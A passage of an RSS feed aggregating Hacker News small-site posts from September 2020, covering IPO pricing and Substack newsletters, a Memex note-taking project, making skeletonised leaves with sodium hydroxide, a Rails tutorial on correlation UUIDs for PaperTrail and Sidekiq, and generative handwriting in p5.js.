<p>I agree there’s money left on the table, but think about the alternative. Suppose BYND priced at $100 right from the start. That leaves nothing on the table, but now there’s a much higher chance the price declines after the IPO. And if it does decline, perhaps the price momentum keeps sinking it lower. We don’t know how much of the current trading price of BYND is due to momentum, and it seems to me it could have gone the other way as well. The general public still thinks of FB, GOOG, and Uber’s IPOs as failures due to the lack of a “pop”. You might argue who cares about the general public, but employee morale within the company is affected as well. My point here is there’s currently less incentive for companies to get pricing exactly right, and who knows what the right price is anyway [5]?</p>

<h2 id="why-are-newsletters-becoming-popular-and-where-is-this-trend-going">Why are newsletters becoming popular and where is this trend going?</h2>

<p>After I published last month’s newsletter, <a href="https://on.substack.com/p/the-future-of-substack" title="substack site">a16z led a $15mm funding round in Substack</a>, the platform I’m currently using to send this [6]. I’m going to talk about why a16z was interested in Substack and where I think this trend is headed.</p>

<p>From <a href="https://a16z.com/2019/07/16/substack/" title="a16z">a16z’s press release</a>:</p>

<blockquote>
  <p>Since then, the internet has opened up new opportunities for media producers. A writer, streamer, or podcaster can now reach an audience of millions. Powerful tools have been created to make it easier to self-publish any format of content. […] But most of this is driven by advertising-based business models from the 1800s — the technology may have changed, yet the economic model is largely the same.</p>
</blockquote>

<p>Stratechery has <a href="https://stratechery.com/2015/why-web-pages-suck/" title="ads">written before</a> on how ad networks facilitated the growth of advertising on the internet. The move from print media to digital media implied that the marginal cost to serve a consumer was zero. This reduction of the barrier to entry led to an influx of free content online, a trend which has still persisted but evolved into different forms [7].</p>

<p><strong>Because of the low cost to produce, high degree of substitutability, and high degree of fragmentation in the suppliers of content, content producers assumed that <a href="https://www.cnbc.com/2018/11/17/subscription-news-services-flourish-as-google-facebook-dominate-ads.html" title="cnbc">people wouldn’t pay for content</a>, and that selling ads was the better business model.</strong></p>

<p>As <a href="https://www.cnbc.com/2018/11/17/subscription-news-services-flourish-as-google-facebook-dominate-ads.html" title="cnbc">the CNBC article</a> notes though, a few factors have led to the rise of alternative, subscription based models instead. <strong>The dominance and effectiveness of google and facebook in digital advertising means that advertising on traditional content producers such as news sites has become less effective.</strong> As an advertiser, I’d rather spend more of my ad budget on where 60% of the internet is going to pass through and get a higher ROI on my ad spend.</p>

<p><img src="https://www.leonlinsx.com/assets/images/US-digital-advertising-share-2018.png" alt="ads"></p>

<p>The stranglehold on traffic by Google and Facebook also potentially result in a cost to acquire the marginal user, implying that the marginal cost to serve is no longer zero. For the normal media site, you’re now facing a …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.leonlinsx.com/aphantasia/">https://www.leonlinsx.com/aphantasia/</a></em></p>]]>
            </description>
            <link>https://www.leonlinsx.com/aphantasia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532946</guid>
            <pubDate>Sun, 20 Sep 2020 09:47:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Memex – A proof of concept built in Electron and Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24532788">thread link</a>) | @steve1820
<br/>
September 20, 2020 | https://www.steveliu.co/memex | <a href="https://web.archive.org/web/*/https://www.steveliu.co/memex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-33de0799eab39cfadbe1"><div><p>I’ve never been a huge online note taker. From high school to university, I’ve always relied on pen and paper as my weapon of choice. At the time and even to some extent now, I’ve felt like this was a good enough solution to my problems.</p><p>I’ve always felt the simpler the solution the better. Why complicate things?</p><p>This changed however after working as a software engineer in industry. As I worked on a software product that derived its core functionality from machine learning, it seemed that I was constantly drowning in a sea of information.&nbsp;</p><p>It was a constant repetition of learning something, forgetting about it 5 months later and then having to recycle through my notes and reread the article/paper/blog.</p><p>My brain was a leaky bucket. Every time I poured something in, something else would leak out.</p><p>It was during those dark times of desperation that I stumbled upon the “niche” industry of Knowledge Management Systems (KMS) and as an extension, the Memex.</p><p> I was fascinated with all the innovation coming from up and coming open source projects and companies in this space. Software like Athens (https://github.com/athensresearch/athens), Roam (https://roamresearch.com/), Obsidian (https://obsidian.md/) all seemed so promising. </p><p>I was particularly inspired by reading karlicoss’s blog (https://beepb00p.xyz/promnesia.html). He outlines so many good and intuitive reasons why the current solutions are broken (although in this particular post he focuses on browser history).</p></div></div></div></div>]]>
            </description>
            <link>https://www.steveliu.co/memex</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532788</guid>
            <pubDate>Sun, 20 Sep 2020 08:55:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making Skeletonised Leaves]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24532709">thread link</a>) | @arbol
<br/>
September 20, 2020 | https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/ | <a href="https://web.archive.org/web/*/https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1332">

	

	
			<figure>
				<img width="992" height="1331" src="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=992" alt="" loading="lazy" srcset="https://adq454703481.files.wordpress.com/2020/09/dried.jpg 992w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=768 768w" sizes="(max-width: 992px) 100vw, 992px" data-attachment-id="1333" data-permalink="https://blog.lidskialf.net/dried/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=763">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>I decided I wanted to try making some skeletonised leaves. So I did some Googling and decided to try <a href="https://penguinbaybiology.org/make-clear-leaf-view-vein-structure/">this</a> approach.</p>



<p>We went out in the evening and gathered some leaves from the local  Shrubbery. Totally not suspicious 🙂</p>



<figure><img data-attachment-id="1343" data-permalink="https://blog.lidskialf.net/leaves/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203574&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;909&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="leaves" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>I bought some Sodium Hydroxide and a cheap steel pot from ebay. Note: it must <strong>not</strong> be Aluminium as the Sodium Hydroxide will react with Aluminium!</p>



<figure><img data-attachment-id="1336" data-permalink="https://blog.lidskialf.net/ingredients/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381793&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;543&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="ingredients" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Although Sodium Hydroxide isn’t a deadly poison, you really don’t want it on your skin or in your eyes, so gloves/goggles are a necessity for safety. Hmm, I should really look into some sort of cheap lab coat as well to protect my clothes for this sorta stuff:</p>



<figure><img data-attachment-id="1339" data-permalink="https://blog.lidskialf.net/safety/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381856&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;634&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="safety" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I scaled up the proportions to 1L of (Edinburgh) tap water and 30G of Sodium Hydroxide powder. I put them in the pot, brought it to the boil and added the leaves. </p>



<p>For fun I also tested the pH of the solution with my new pH paper (also from Ebay/China). Its about a 14, so pretty alkaline!</p>



<figure><img data-attachment-id="1340" data-permalink="https://blog.lidskialf.net/phpaper/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203853&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;108&quot;,&quot;shutter_speed&quot;:&quot;0.04001&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="phpaper" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>The instructions suggested boiling for about two hours, but it appears to depend on the leaves you choose. I checked on it every 20 minutes or so, and pulled leaves out as they became ready. </p>



<p>To process them, I had the following set up next to the pot:</p>



<ul><li>Tray 1: Plain tap water to wash off the Sodium Hydroxide.</li><li>Tray 2: Some “Ordinary Household Bleach” (aka Sodium Hypochlorite) to bleach any remaining colour out.</li><li>Tray 3: More plain tap water to wash off the bleach.</li><li>A sheet of alumunium foil to put the leaves on to dry out.</li></ul>



<p>After all of them were processed, I ended up with this:</p>



<figure><img data-attachment-id="1345" data-permalink="https://blog.lidskialf.net/drying/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600212131&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;104&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="drying" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The next morning I was able to unpeel the more robust leaves, yielding me these:</p>



<figure><img data-attachment-id="1346" data-permalink="https://blog.lidskialf.net/dried-1/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried-1" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>Observations</p>



<ul><li>You need to use <em>robust</em> leaves from trees. I tried some nettle leaves, but they quickly turned to mush. Some of the tree leaves appeared to process fine, but turned out to be way too delicate to remove from the foil after drying: definitely depends on the species. There may be a better way to dry them, will think on it.</li><li>Only process one species of leaf at a time, otherwise you constantly have to check each one in the pot, which means you’re disturbing them more to check.</li><li>Make sure to check on the water level! I <em>almost</em> boiled it dry.</li><li>Its fiddly! During processing, you have to <em>carefully</em> unroll the leaves by hand while wearing gloves to get them flat prior to drying.</li><li>I tried processing a dried up Oak leaf since theoretically it should be closer to being skeletonised: it didn’t seem to work very well (you can see the unsuccessful result on the aluminium foil photo).</li></ul>



<p>What Next?</p>



<p>They’re definitely more robust than I expected, but they’re still quite delicate. I fancy trying dying them and embedding them into some transparent resin next.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532709</guid>
            <pubDate>Sun, 20 Sep 2020 08:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking All Paper Trail Version from a Single Request with Correlation UUIDs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532550">thread link</a>) | @Azdaroth
<br/>
September 20, 2020 | https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/ | <a href="https://web.archive.org/web/*/https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>If you’ve ever had a need to implement an <strong>audit log</strong> to track all the changes that get persisted for all or at least some models in your application, there is a good chance that you’ve encountered <a href="https://github.com/paper-trail-gem/paper_trail">PaperTrail gem</a> that makes it trivial to <strong>track all the changes</strong> - it might be as easy as adding <code>has_paper_trail</code> to the desired models.</p>

<p>However, storing versions is just one thing. The other one is using them later, which sometimes might be far from obvious. For example, you see that some record was updated, but you don’t exactly know why. Maybe you have <code>whodunnit</code> stored, but it still doesn’t give you the entire picture as there might be multiple ways how a given record can be updated and you are trying to establish some <strong>causality</strong> between multiple actions as one update can lead to another one that can lead to yet another one. Not to mention that the persistence can be executed from the background jobs, which will mean that <code>whodunnit</code> will either be nil or be something else (if you, for example, decide to use the name of the job class for <code>paper_trail_user</code>). Merely using <code>created_at</code> won’t be that useful for sure as it’s not enough to group versions form the same context.</p>

<p>Fortunately, there is an easy solution to this problem, which is also quite simple to implement - it’s adding a <code>correlation UUID</code>.</p>

<h2 id="what-is-correlation-uuid">What Is Correlation UUID?</h2>

<p>Correlation UUID is a value in UUID format that is used for grouping <em>things</em> (events, logs…) that have the same origin (e.g., a specific action) that helps establish the causality (how exactly you ended up with something and what events lead to it). Thanks to that, you can easily figure out what happened during a specific request by assigning the same value of correlation UUID to all PaperTrailVersion records that got created. Furthermore, you can also track its side effects by reusing the same value in background jobs, e.g., in Sidekiq.</p>

<p>You might be wondering if this really has to be in UUID format, but the answer here is simple: no, it doesn’t need to be. For example, you can use ULID, which could even be a better choice as it has the benefit of being lexicographically sortable. It just happens that UUID is the most popular approach and it’s easy to generate.</p>

<h2 id="how-to-implement-correlation-uuid-for-papertrailversions">How to implement Correlation UUID for PaperTrailVersions</h2>

<p>The most straightforward approach would be assigning some global value unique per request (which implies the need for thread-safety) before saving the version. So what we need is an extra column (<code>correlation_uuid</code>) and something like <code>Thread.current</code> store but with values erased after each request. Fortunately, there is a gem that does exactly that: <a href="https://github.com/steveklabnik/request_store">request_store</a>.</p>

<p>Using a global is quite ugly, but it allows us to implement the desired feature in a simple way, and it doesn’t necessarily make the design worse as <code>paper_trail</code> already uses a similar global for storing, e.g. <code>whodunnit</code> value.</p>

<p>Here is how an example UUID generator could look like:</p>

<div><div><pre><code><span>class</span> <span>RequestCorrelationUuidGenerator</span>
  <span>def</span> <span>self</span><span>.</span><span>uuid</span>
    <span>store</span><span>[</span><span>:correlation_uuid</span><span>]</span> <span>||=</span> <span>SecureRandom</span><span>.</span><span>uuid</span>
  <span>end</span>

  <span>def</span> <span>self</span><span>.</span><span>uuid</span><span>=</span><span>(</span><span>value</span><span>)</span>
    <span>store</span><span>[</span><span>:correlation_uuid</span><span>]</span> <span>=</span> <span>value</span>
  <span>end</span>

  <span>def</span> <span>self</span><span>.</span><span>store</span>
    <span>RequestStore</span><span>.</span><span>store</span><span>[</span><span>:paper_trail</span><span>]</span> <span>||=</span> <span>{}</span>
  <span>end</span>
  <span>private_class_method</span> <span>:store</span>
<span>end</span>
</code></pre></div></div>

<p><code>paper_trail</code> stores global data in <code>RequestStore.store[:paper_trail]</code> so it’s a reasonable idea to reuse it for storing our correlation UUID.</p>

<p>Now, that we have a generator, let’s add a callback to the to PaperTrailVersion model:</p>

<div><div><pre><code><span>class</span> <span>Version</span> <span>&lt;</span> <span>PaperTrail</span><span>::</span><span>Version</span>
  <span>before_create</span> <span>:ensure_correlation_uuid_assigned</span>

  <span>private</span>

  <span>def</span> <span>ensure_correlation_uuid_assigned</span>
    <span>self</span><span>.</span><span>correlation_uuid</span> <span>=</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>And that’s it! That will be enough to group version coming from a single request. Now, if you find something suspicious, you can take the correlation UUID, find other versions with that value, order them by <code>created_at,</code> and the debugging should be way more pleasant. Just don’t forget to add the index ;).</p>

<h2 id="correlation-uuid-for-further-side-effects---how-to-use-it-in-background-jobs">Correlation UUID for further side-effects - how to use it in background jobs?</h2>

<p>As I mentioned earlier, it might be quite valuable to pass the correlation UUID further to the background jobs, so that we can understand every step of the saga that originated from a specific action.</p>

<p>Of course, background jobs are not requests, but fortunately, it’s not that difficult to reuse our <code>RequestCorrelationUuidGenerator</code> inside jobs.</p>

<p>Since Sidekiq is arguably the most popular solution for background jobs processing in Rails apps, I will show an example solution for Sidekiq. However, the idea itself should be possible to replicate for every other processor.</p>

<p>As a prerequisite to make it work with Sidekiq, we will need to introduce <a href="https://github.com/madebylotus/request_store-sidekiq">request_store-sidekiq</a> gem. Since <code>request_store</code> clears the storage after each request, so that the values don’t stick between them, we need something that will do the same thing, but after the job is processed. And that’s exactly what this gem does.</p>

<p>The first problem that we need to solve is to make the correlation UUID somehow available in the job. One way to do this would be to make it an argument of the job, but that sounds painful to deal with. Ideally, we would have something that doesn’t force us to change the signature of the <code>perform</code> method, and that injects the value without us doing it directly in any place. The second problem to solve would be to extract somehow the value of correlation UUID before the job gets executed and set that UUID for the global context (for a current Thread) using <code>RequestCorrelationUuidGenerator.uuid=</code> attribute writer.</p>

<p>Fortunately, Sidekiq has us covered as it allows us to add some extra behavior when enqueuing the job and around the execution of the job. We can do that using <a href="https://github.com/mperham/sidekiq/wiki/Middleware">middlewares</a>.</p>

<p>What we will need are two middlewares:</p>
<ul>
  <li>a client middleware that will inject the correlation UUID to the job</li>
  <li>a server middleware that will set the correlation UUID</li>
</ul>

<p>Here is an example implementation of the desired client middleware:</p>

<div><div><pre><code><span>class</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>def</span> <span>call</span><span>(</span><span>_worker_class</span><span>,</span> <span>job</span><span>,</span> <span>_queue</span><span>,</span> <span>_redis_pool</span><span>)</span>
    <span>job</span><span>[</span><span>"correlation_uuid"</span><span>]</span> <span>=</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span>
    <span>yield</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Since <code>job</code> is a hash of a serialized job, we can put there pretty much anything we want. That way, we will make sure that the correlation UUID is stored in Redis.</p>

<p>And here is the server middleware:</p>

<div><div><pre><code><span>class</span> <span>SetCorrelationUuidMiddleware</span>
  <span>def</span> <span>call</span><span>(</span><span>_worker</span><span>,</span> <span>job</span><span>,</span> <span>_queue</span><span>)</span>
    <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span> <span>=</span> <span>job</span><span>.</span><span>fetch</span><span>(</span><span>"correlation_uuid"</span><span>,</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span><span>)</span>
    <span>yield</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The last thing we need to do is to actually inject these middlewares so that Sidekiq can make the proper use of them. We can put that in an initializer:</p>

<div><div><pre><code><span>Sidekiq</span><span>.</span><span>configure_client</span> <span>do</span> <span>|</span><span>config</span><span>|</span>
  <span>config</span><span>.</span><span>client_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>end</span>
<span>end</span>

<span>Sidekiq</span><span>.</span><span>configure_server</span> <span>do</span> <span>|</span><span>config</span><span>|</span>
  <span>config</span><span>.</span><span>client_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>end</span>

  <span>config</span><span>.</span><span>server_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>SetCorrelationUuidMiddleware</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>To understand more about middlewares, it would definitely help to get through the <a href="https://github.com/mperham/sidekiq/wiki/Middleware">docs</a>. What is important to remember here is that jobs can also enqueue other jobs. That’s why we need to add <code>SetCorrelationUuidMiddleware</code> twice - one for the client (e.g., for the request) and for the server (other jobs).</p>

<h2 id="alternatives-and-similar-problems">Alternatives and similar problems</h2>

<p>If you find yourself often wondering about the causality between the events, state transition, and trying to figure out how you exactly ended up in a given state, you might consider changing the implementation of your domain model and perhaps introduce CQRS and Event Sourcing. You might also want to check Sagas and Process Managers. Even though these are the concepts that are used rather in distributed systems, you might still find them useful if you have a complex logic that gets executed in the jobs that often enqueue other jobs.</p>

<h2 id="wrapping-up">Wrapping Up</h2>

<p>Having <strong>correlation UUID</strong> assigned to <strong>PaperTrail Versions</strong> is something that might significantly <strong>help with debugging</strong>. Fortunately, it’s something that is not that difficult to implement.</p>


      
      <section>
  <b>posted in:</b>

  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/ruby">
        Ruby,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/rails">
        Rails,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/ruby-on-rails">
        Ruby on Rails,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/paper-trail">
        Paper Trail,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/audit-log">
        Audit Log,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/correlation-uuid">
        Correlation UUID
      </a>
    </span>
  
</section>

    </div></div>]]>
            </description>
            <link>https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532550</guid>
            <pubDate>Sun, 20 Sep 2020 07:48:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generative Bad Handwriting]]>
            </title>
            <description>
<![CDATA[
Score 190 | Comments 17 (<a href="https://news.ycombinator.com/item?id=24532352">thread link</a>) | @atulvi
<br/>
September 19, 2020 | https://avinayak.github.io/programming/art/2020/09/18/p5-strokes.html | <a href="https://web.archive.org/web/*/https://avinayak.github.io/programming/art/2020/09/18/p5-strokes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>So.. I made a popular tweet last week in the <a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hashtag_click">#つぶやきProcessing</a> circles.</p>

<blockquote><p lang="cy" dir="ltr">j=24,m=0,draw=(a=&gt;{for(v=(i=&gt;w/3*(n=noise)(i)-k),createCanvas(w=1e3,w),noFill(),background('<a href="https://twitter.com/hashtag/fd7?src=hash&amp;ref_src=twsrc%5Etfw">#fd7</a>'),translate(0,m--),i=0,y=0;y&lt;w-m;y+=j)for(x=k=90;x&lt;w-k;x+=9)if(y+k&gt;-m?curve(v(i++)+x,v(i++)+y,x,j+y,x+9,j+y,v(i++)+x,v(i++)+y):i+=4,x+=v(i++)%9,n(x*y)&lt;.13)y+=j});//<a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hash&amp;ref_src=twsrc%5Etfw">#つぶやきProcessing</a> <a href="https://t.co/WNIwAAAXjQ">pic.twitter.com/WNIwAAAXjQ</a></p>— atulvinayak (@atulvinayak) <a href="https://twitter.com/atulvinayak/status/1305116417419653120?ref_src=twsrc%5Etfw">September 13, 2020</a></blockquote>


